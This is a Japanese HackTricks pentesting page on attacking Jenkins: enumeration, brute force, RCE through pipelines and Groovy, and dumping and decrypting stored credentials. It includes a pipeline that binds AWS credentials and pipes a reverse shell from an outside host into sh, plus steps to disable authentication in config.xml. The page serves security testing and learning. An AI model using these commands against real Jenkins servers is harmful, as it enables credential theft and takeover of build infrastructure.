# Jenkins セキュリティ

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## 基本情報

Jenkinsは、パイプラインを使用してほぼ**任意**の**言語**とソースコードリポジトリの組み合わせに対して**継続的インテグレーション**または**継続的デリバリー**（CI/CD）環境を簡単に設定する方法を提供し、他のルーチンな開発タスクの自動化も行います。Jenkinsは**個々のステップのスクリプトを作成する必要性**を排除するわけではありませんが、自分で簡単に構築できるよりも、ビルド、テスト、デプロイツールの全チェーンを統合するためのより速くて堅牢な方法を提供します。\
定義は[こちら](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html)から。

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## 認証なしの列挙

認証なしで興味深いJenkinsページ（例：_/people_ や _/asynchPeople_、これは現在のユーザーをリストします）を探すために、次の方法を使用できます：
```
msf> use auxiliary/scanner/http/jenkins_enum
```
認証なしでコマンドを実行できるかどうかを確認します：
```
msf> use auxiliary/scanner/http/jenkins_command
```
認証情報がなくても、_**/asynchPeople/**_ パスや _**/securityRealm/user/admin/search/index?q=**_ を見ることで**ユーザー名**を探すことができます。

_**/oops**_ や _**/error**_ のパスからJenkinsのバージョンを取得できる可能性があります。

![](<../../.gitbook/assets/image (48).png>)

### 既知の脆弱性

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ログイン

基本情報で、Jenkinsにログインする**すべての方法**を確認できます：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 登録

アカウントを作成してログインできるJenkinsインスタンスを見つけることができます。それだけです。

### **SSO ログイン**

また、**SSO** **機能**/**プラグイン**が存在する場合は、テストアカウント（例えば、テスト**Github/Bitbucket アカウント**)を使用してアプリケーションに**ログイン**することを試みるべきです。[**こちら**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)からのコツです。

### ブルートフォース

**Jenkins**は**パスワードポリシー**やユーザー名の**ブルートフォース対策**を**実装していません**。したがって、弱い**パスワード**が使用されている可能性が高いため、常にユーザーの**ブルートフォース**を試みる**べきです**（**ユーザー名をパスワード**として使用する場合や、ユーザー名を逆にしたパスワードも含まれます）。
```
msf> use auxiliary/scanner/http/jenkins_login
```
### パスワードスプレー

[このPythonスクリプト](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py)または[このPowerShellスクリプト](https://github.com/chryzsh/JenkinsPasswordSpray)を使用してください。

### IPホワイトリストバイパス

多くの組織は、**SaaSベースのソースコントロール管理（SCM）システム**（GitHubやGitLabなど）と**内部**で自己ホストされた**CI**ソリューション（例えばJenkins、TeamCity）を組み合わせて使用し、これらのCIシステムがSaaSソースコントロールベンダーからの**ウェブフックイベントを受信**し、パイプラインジョブをトリガーするために設定されています。

そのため、組織は**SCM**の**IP**範囲を**ホワイトリスト**に登録し、それらが**ウェブフック**を介して**内部**CIシステムにアクセスできるようにします。しかし、**誰でも**GitHubやGitLabに**アカウント**を作成し、**ウェブフックをトリガー**してその**内部CIシステム**にリクエストを送信できることに注意してください。

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## 内部Jenkinsの悪用

これらのシナリオでは、Jenkinsにアクセスするための有効なアカウントを持っていると仮定します。

{% hint style="warning" %}
Jenkinsに設定されている**認証**メカニズムと侵害されたユーザーの権限によっては、以下の攻撃を**実行できるかどうかが異なります。**
{% endhint %}

詳細については、基本情報を確認してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ユーザーのリストアップ

Jenkinsにアクセスした場合、[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)で他の登録ユーザーをリストアップできます。

### ビルドのダンプで平文のシークレットを探す

ビルドコンソールの出力とビルド環境変数をダンプして、平文のシークレットを見つけることを期待して[このスクリプト](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)を使用してください。
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH認証情報の盗難**

侵害されたユーザーが**新しいJenkinsノードを作成/変更するための十分な権限を持っている**場合、そしてSSH認証情報が他のノードにアクセスするために既に保存されている場合、彼はホストキーを検証せずに認証情報を記録するホストを設定することによって**それらの認証情報を盗む**ことができます：

![](<../../.gitbook/assets/image (56).png>)

通常、JenkinsのSSH認証情報は**グローバルプロバイダー**(`/credentials/`)にありますので、他のシークレットをダンプするのと同じようにダンプすることもできます。詳細は[**シークレットのダンプセクション**](./#dumping-secrets)を参照してください。

### **JenkinsでのRCE**

**Jenkinsサーバーでのシェル**を取得することは、攻撃者に全ての**シークレット**と**環境変数**を漏洩させ、同じネットワーク内にある他のマシンを**攻撃する**機会を与えるか、または**クラウド認証情報を収集する**ことができます。

デフォルトでは、Jenkinsはビルドを**「システムとして実行」**します。言い換えると、それは**全能のSYSTEMユーザー**に割り当てられ、ビルド中に実行される任意のアクションは何でもできる権限を持っています。

### **プロジェクトの作成/変更によるRCE**

プロジェクトの作成/変更は、Jenkinsサーバーに対するRCEを取得する方法です：

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovyスクリプトの実行によるRCE**

Groovyスクリプトを実行することによってもRCEを取得できますが、新しいプロジェクトを作成するよりも隠密に行えるかもしれません：

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### パイプラインの作成/変更によるRCE

**パイプラインの作成/変更によってもRCEを取得できます**：

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## パイプラインの悪用

パイプラインを悪用するには、依然としてJenkinsへのアクセスが必要です。

### ビルドパイプライン

**パイプライン**はプロジェクトの**ビルドメカニズムとしても使用できます**。その場合、リポジトリ内のファイルにパイプラインの構文が設定されます。デフォルトでは`/Jenkinsfile`が使用されます：

![](<../../.gitbook/assets/image (14) (1) (1).png>)

また、リポジトリ**アクセス**とパイプラインアクセスを**分離する**目的で、パイプライン設定ファイルを他の場所（例えば他のリポジトリ）に保存することも可能です。

攻撃者がそのファイルに**書き込みアクセスを持っている**場合、ファイルを**変更**し、Jenkinsにアクセスすることなくパイプラインを**トリガーする可能性**があります。\
攻撃者は、**ブランチ保護をバイパスする必要がある**かもしれません（プラットフォームとユーザー権限によっては、バイパスできるかもしれませんし、できないかもしれません）。

カスタムパイプラインを実行するための最も一般的なトリガーは以下の通りです：

* メインブランチへの**プルリクエスト**（または他のブランチに対しても可能性があります）
* メインブランチへの**プッシュ**（または他のブランチに対しても可能性があります）
* メインブランチを**更新**し、何らかの方法で実行されるのを待つ

{% hint style="info" %}
**外部ユーザー**であれば、他のユーザー/組織のリポジトリのメインブランチに**PRを作成**してパイプラインを**トリガーする**ことを期待すべきではありません...しかし、**悪い設定**であれば、このことを悪用するだけで企業を完全に**危険にさらす**ことができます。
{% endhint %}

### パイプラインRCE

前のRCEセクションでは、[**パイプラインを変更してRCEを取得する**](./#rce-creating-modifying-pipeline)技術がすでに指摘されていました。

### 環境変数のチェック

パイプライン全体または特定のステージに対して**クリアテキストの環境変数**を宣言することができます。この環境変数には**機密情報を含まない**べきですが、攻撃者は常に**全てのパイプライン**の設定やJenkinsfileを**チェックする**ことができます。
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### シークレットのダンプ

Jenkinsが通常どのようにシークレットを扱っているかについての情報は、基本情報を確認してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

クレデンシャルは**グローバルプロバイダーにスコープされる**（`/credentials/`）か、**特定のプロジェクトにスコープされる**（`/job/<project-name>/configure`）。したがって、すべてを抜き取るためには、シークレットを含む**少なくともすべてのプロジェクトを侵害し**、カスタム/毒されたパイプラインを実行する必要があります。

もう一つの問題は、パイプラインの**env内のシークレットを取得する**ためには、シークレットの**名前とタイプを知る必要がある**ことです。例えば、**`usernamePassword`** **シークレット**を**`string`** **シークレット**として**ロード**しようとすると、次のような**エラー**が発生します：
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
以下は、いくつかの一般的なシークレットタイプをロードする方法です：
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
このページの最後に、**すべての資格情報タイプを見つけることができます**： [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**一度にすべてのシークレットをダンプする** 最良の方法は、**Jenkins** マシンを**侵害**することです（例えば、**ビルトインノード**でリバースシェルを実行する）その後、**マスターキー**と**暗号化されたシークレット**を**リーク**して、オフラインで復号化します。\
この方法の詳細は [ノード＆エージェントセクション](./#nodes-and-agents) と [ポストエクスプロイテーションセクション](./#post-exploitation) で説明しています。
{% endhint %}

### トリガー

[ドキュメント](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers) から：`triggers` ディレクティブは、**パイプラインが自動的に再トリガーされる方法**を定義します。GitHub や BitBucket などのソースと統合されているパイプラインの場合、`triggers` は必要ないかもしれません。なぜなら、Webhookベースの統合が既に存在している可能性が高いからです。現在利用可能なトリガーは `cron`、`pollSCM`、`upstream` です。

Cronの例：
```bash
triggers { cron('H */4 * * 1-5') }
```
**他の例はドキュメントで確認してください。**

### ノード & エージェント

**Jenkinsインスタンス**は、**異なるマシンで実行されているエージェント**を持つことがあります。攻撃者の観点から、異なるマシンへのアクセスは、盗むべき**潜在的なクラウド認証情報**や、他のマシンを悪用するために乱用される可能性のある**異なるネットワークアクセス**を意味します。

詳細については基本情報を確認してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

`/computer/`で**設定されたノード**を列挙することができます。通常、\*\*`Built-In Node` \*\*（Jenkinsを実行しているノード）と、潜在的にさらに多くのノードを見つけることができます：

![](<../../.gitbook/assets/image (25).png>)

**Built-Inノードを侵害することは特に興味深い**です。なぜなら、それは機密性の高いJenkins情報を含んでいるからです。

**ビルトインJenkinsノード**で**パイプライン**を**実行**したいことを示すために、パイプライン内で以下の設定を指定することができます：
```bash
pipeline {
agent {label 'built-in'}
```
### 完全な例

特定のエージェントでのパイプライン、cronトリガーを使用し、パイプラインとステージの環境変数を持ち、ステップで2つの変数を読み込み、リバースシェルを送信します：
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## ポストエクスプロイト

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins シークレット

適切な権限があれば、`/credentials/` にアクセスしてシークレットをリストできます。これにより `credentials.xml` ファイル内のシークレットのみがリストされることに注意してくださいが、**ビルド設定ファイル**には**さらに多くのクレデンシャル**が含まれている可能性があります。

各プロジェクトの**設定を見ることができれば**、そこでリポジトリにアクセスするために使用されている**クレデンシャル（シークレット）の名前**と**プロジェクトのその他のクレデンシャル**も見ることができます。

![](<../../.gitbook/assets/image (9) (1) (1).png>)

#### Groovy から

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### ディスクから

これらのファイルが**Jenkins シークレットを復号化する**ために必要です：

* secrets/master.key
* secrets/hudson.util.Secret

このような**シークレットは通常以下で見つけることができます**：

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

それらを見つけるための正規表現はこちらです：
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkinsの秘密をオフラインで解読する

**必要なパスワードをダンプした場合**、[**このスクリプト**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py)を使用して**それらの秘密を解読します**。
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### GroovyからJenkinsの秘密を解読する
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### 新しい管理ユーザーを作成する

1. `/var/lib/jenkins/config.xml` または `C:\Program Files (x86)\Jenkis\` にある Jenkins の config.xml ファイルにアクセスします。
2. `<useSecurity>true</useSecurity>`という単語を探して、**`true`** を **`false`** に変更します。
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** サーバーを**再起動**します: `service jenkins restart`
4. 再び Jenkins ポータルにアクセスし、今回は**認証を求められません**。 "**Manage Jenkins**" に移動して、**管理者パスワードを再設定**します。
5. `<useSecurity>true</useSecurity>` に設定を変更して**セキュリティを再度有効にし**、**Jenkins を再起動**します。

## 参考文献

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)

<details>

<summary><strong>AWS ハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションをご覧ください。
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に**参加する**か、[**テレグラムグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを**共有**してください。

</details>
